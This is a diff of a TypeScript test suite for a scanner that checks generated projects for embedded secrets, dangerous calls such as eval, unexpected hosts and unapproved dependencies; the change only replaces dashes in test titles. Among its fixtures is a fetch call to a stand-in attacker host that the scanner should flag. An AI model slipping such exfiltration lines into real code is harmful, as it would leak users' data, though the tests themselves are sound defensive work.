@@ -8,7 +8,7 @@ function file(path: string, content: string): ScanFile {
   return { path, content };
 }
 
-describe("scanGeneratedProject — secrets", () => {
+describe("scanGeneratedProject: secrets", () => {
   it("flags an embedded private key", () => {
     const r = scanGeneratedProject([
       file("src/x.ts", "const k = `-----BEGIN RSA PRIVATE KEY-----`;"),
@@ -51,7 +51,7 @@ describe("scanGeneratedProject — secrets", () => {
   });
 });
 
-describe("scanGeneratedProject — dangerous code", () => {
+describe("scanGeneratedProject: dangerous code", () => {
   it("flags eval, new Function, child_process, spawn", () => {
     const cases = [
       "eval(userInput)",
@@ -75,7 +75,7 @@ describe("scanGeneratedProject — dangerous code", () => {
   });
 });
 
-describe("scanGeneratedProject — hosts", () => {
+describe("scanGeneratedProject: hosts", () => {
   it("flags an unexpected exfiltration host", () => {
     const r = scanGeneratedProject(
       [file("src/x.ts", 'fetch("https://evil.example-attacker.com/collect")')],
@@ -206,7 +206,7 @@ describe("scanGeneratedProject: documentation vs behaviour", () => {
   });
 });
 
-describe("scanGeneratedProject — dependency allowlist (§16.4)", () => {
+describe("scanGeneratedProject: dependency allowlist (§16.4)", () => {
   const pkg = (deps: Record<string, string>, dev: Record<string, string> = {}) =>
     file("package.json", JSON.stringify({ name: "x", dependencies: deps, devDependencies: dev }, null, 2));
 
@@ -258,7 +258,7 @@ describe("summarizeScan", () => {
   });
 });
 
-describe("scanGeneratedProject — real generated output has no false positives", () => {
+describe("scanGeneratedProject: real generated output has no false positives", () => {
   const options: GenerateOptions = {
     serverName: "github-mcp-server",
     displayName: "GitHub MCP Server",
@@ -303,7 +303,7 @@ describe("scanGeneratedProject — real generated output has no false positives"
       // Surface what tripped so a regression is obvious.
       throw new Error(
         "real output failed scan:\n" +
-          result.findings.map((f) => `  ${f.path}:${f.line} ${f.rule} — ${f.excerpt}`).join("\n"),
+          result.findings.map((f) => `  ${f.path}:${f.line} ${f.rule}: ${f.excerpt}`).join("\n"),
       );
     }
     expect(result.passed).toBe(true);
